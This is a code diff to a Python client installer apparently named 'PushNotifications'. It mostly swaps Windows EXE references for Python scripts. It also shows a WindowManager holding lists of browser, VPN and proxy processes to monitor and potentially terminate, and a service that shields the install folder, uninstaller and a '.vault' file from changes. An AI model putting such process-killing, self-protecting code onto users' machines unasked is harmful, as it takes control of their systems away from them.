@@ -9,7 +9,7 @@
 PushNotifications Universal Client Installer
 Version: 1.8.4
 
-Cross-platform installer with Windows executable conversion:
+Cross-platform installer with native Python operation:
 
 🌐 UNIVERSAL PYTHON INSTALLER
 - Single .py file runs on Windows, macOS, Linux
@@ -78,9 +78,9 @@ def check_and_install_package(package_name, pip_name=None):
         __import__(package_name)
         return True
     except ImportError:
-        # Check if running as PyInstaller bundle (Windows EXE)
+        # Check if running as PyInstaller bundle (now using Python scripts)
         if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
-            print(f"Warning: {package_name} not bundled in EXE - may cause issues")
+            print(f"Warning: {package_name} not bundled - may cause issues")
             return False
         
         # Only install if not found in any Python environment
@@ -482,11 +482,11 @@ if platform.system() == "Windows":
 
 
 # Windows administrative functionality is now handled directly within the installer
-# No separate executable conversion is needed
+# All operations use native Python scripts with proper privilege handling
 
 
 class PushNotificationsInstaller:
-    """Advanced installer with Windows executable conversion and full security features"""
+    """Advanced installer with Python-based implementation and full security features"""
     
     def __init__(self, api_url=None):
         self.system = platform.system()
@@ -1832,11 +1832,14 @@ class WindowManager:
     
     def __init__(self):
         self.minimized_windows = []
+        # Process executable names to monitor and potentially terminate
+        # These refer to Windows process names (actual .exe files) that may be running
         self.restricted_processes = {{
             'browsers': ['chrome.exe', 'firefox.exe', 'msedge.exe', 'opera.exe', 'brave.exe', 'iexplore.exe'],
             'vpn': ['openvpn.exe', 'nordvpn.exe', 'expressvpn.exe', 'cyberghost.exe', 'tunnelbear.exe'],
             'proxy': ['proxifier.exe', 'proxycap.exe', 'sockscap.exe']
         }}
+        # System processes that should never be terminated even if detected
         self.allowed_processes = ['taskmgr.exe', 'dwm.exe', 'winlogon.exe', 'csrss.exe', 'lsass.exe', 'services.exe']
     
     def minimize_all_windows(self):
@@ -3122,10 +3125,9 @@ class FileSystemProtectionService:
         self.protected_paths = {{
             str(self.install_path),
             str(self.install_path.parent),
-            str(self.install_path / "Client.exe"),
             str(self.install_path / "Client.py"),
-            str(self.install_path / "Uninstaller.exe"),
-            str(self.install_path / "WatchdogService.exe"),
+            str(self.install_path / "Uninstaller.py"),
+            str(self.install_path / "Installer.py"),
             str(self.install_path / ".vault"),
             str(self.install_path / ".security_marker")
         }}
